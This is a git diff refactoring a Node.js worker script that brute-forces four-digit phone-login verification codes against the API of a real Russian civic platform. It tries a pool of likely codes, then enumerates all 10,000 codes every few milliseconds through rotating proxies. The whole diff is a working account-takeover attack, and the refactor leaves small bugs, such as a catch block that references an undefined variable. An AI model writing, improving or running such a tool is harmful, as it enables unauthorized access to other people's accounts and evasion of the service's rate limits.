@@ -1,8 +1,9 @@
-const { parentPort, workerData } = require('worker_threads');
 const axios = require('axios');
-const { PROXIES, CODE_POOL, BRUTE_TYPE } = require('../configs');
-var padStart = require('lodash/padStart')
 const async = require('async');
+const { parentPort, workerData } = require('worker_threads');
+const { PROXIES, CODE_POOL, BRUTE_TYPE } = require('../configs');
+const padStart = require('lodash/padStart')
+
 const instance = axios.create({
     baseURL: 'https://api.za.gorodsreda.ru/v1',
     timeout: 5000,
@@ -19,94 +20,68 @@ const instance = axios.create({
 });
 
 if(PROXIES.length >= 1) {
-    let random_proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)];
-    instance.defaults.proxy = random_proxy;
+    instance.defaults.proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)];
 }
 
 const { personUid } = workerData;
 
-console.log(workerData)
-
 function clock(start) {
-    if ( !start ) return process.hrtime();
+    if (!start) return process.hrtime();
     var end = process.hrtime(start);
     return Math.round((end[0]*1000) + (end[1]/1000000));
 }
 
-if(personUid) {
-  var count = 0;
-  var start = clock();
+if(!personUid) return;
 
+let count = 0;
+let start = clock();
 
-if(BRUTE_TYPE == "POOL") {
-    async.map(CODE_POOL, async (item, callback) => {
-        let code = padStart(item, 4, '0');
-        await instance.post('/phone-auth/call-code', {personUid, code})
-        .then(res => {
-            var taken_time = clock(start);
-            parentPort.postMessage({success: true, response: {code: JSON.parse(res.config.data).code, data: res.data, time: taken_time / 1000}})
-        })
-        .catch(err => {
-            // if (code % 100 == 0) {
-                //   console.log()
-                //   console.log(`Code: ${code}, \nresponse: ${JSON.stringify(err?.response?.data)}`)
-            // }
-        })
-    }).then(res => {
-        parentPort.postMessage({success: false, error: "Not found!"})
-    })
-} else if(BRUTE_TYPE == "BRUTE") {
+const brute = async () => {
     setInterval(async () => {
         count++
         let code = padStart(count, 4, '0');
-        await instance.post('/phone-auth/call-code', {personUid, code})
-        .then(res => {
-            var taken_time = clock(start);
-  
-            parentPort.postMessage({success: true, response: {code: JSON.parse(res.config.data).code, data: res.data, time: taken_time / 1000}})
-        })
-        .catch(err => {
-            if (code % 500 == 0) {
-                  console.log()
-                  console.log(`Iters: ${code}, \nresponse: ${JSON.stringify(err?.response?.data)}`)
-              }
-        })
-        if(count >= 10001) parentPort.postMessage({success: false, error: "Code expired"})
-      }, 3)    
-} else if(BRUTE_TYPE == "COMBINED") {
-    async.map(CODE_POOL, async (item, callback) => {
-        let code = padStart(item, 4, '0');
-        await instance.post('/phone-auth/call-code', {personUid, code})
-        .then(res => {
-            var taken_time = clock(start);
-            parentPort.postMessage({success: true, response: {code: JSON.parse(res.config.data).code, data: res.data, time: taken_time / 1000}})
-        })
-        .catch(err => {
-            // if (code % 100 == 0) {
-                //   console.log()
-                //   console.log(`Code: ${code}, \nresponse: ${JSON.stringify(err?.response?.data)}`)
-            // }
-        })
-    }).then(res => {
-        console.log(`[INFO] Code in pool not found. Starting brute.`)
-        setInterval(async () => {
-            count++
-            let code = padStart(count, 4, '0');
-            await instance.post('/phone-auth/call-code', {personUid, code})
-            .then(res => {
-                var taken_time = clock(start);
-      
-                parentPort.postMessage({success: true, response: {code: JSON.parse(res.config.data).code, data: res.data, time: taken_time / 1000}})
-            })
-            .catch(err => {
-                if (code % 500 == 0) {
-                      console.log()
-                      console.log(`Iters: ${code}, \nresponse: ${JSON.stringify(err?.response?.data)}`)
-                  }
-            })
-            if(count >= 10001) parentPort.postMessage({success: false, error: "Code expired"})
-          }, 3)  
+
+        try {
+            let response = await instance.post('/phone-auth/call-code', { personUid, code })
+
+            let taken_time = clock(start);
+
+            parentPort.postMessage({success: true, response: {
+                    code: JSON.parse(response.config.data).code,
+                    data: response.data,
+                    time: taken_time / 1000
+                }})
+        } catch (e) {
+            if (code % 500 === 0) console.log(`Iters: ${code}, response: ${JSON.stringify(err?.response?.data)}`)
+        }
+
+        if(count >= 10001) parentPort.postMessage({success: false, error: "Code expired."})
+    }, 3)
+}
+
+const pool = async () => {
+    await async.map(CODE_POOL, async item => {
+        try {
+            let code = padStart(item, 4, '0');
+            let response = await instance.post('/phone-auth/call-code', { personUid, code })
+
+            let taken_time = clock(start);
+
+            parentPort.postMessage({success: true, response: {
+                    code: JSON.parse(response.config.data).code,
+                    data: response.data,
+                    time: taken_time / 1000
+                }})
+        } catch (e) {
+            parentPort.postMessage({success: false, error: "Not found!"})
+        }
     })
 }
 
+if(BRUTE_TYPE === "POOL") {
+    pool().then();
+} else if(BRUTE_TYPE === "BRUTE") {
+    brute().then();
+} else if(BRUTE_TYPE === "COMBINED") {
+    pool().then(brute)
 }
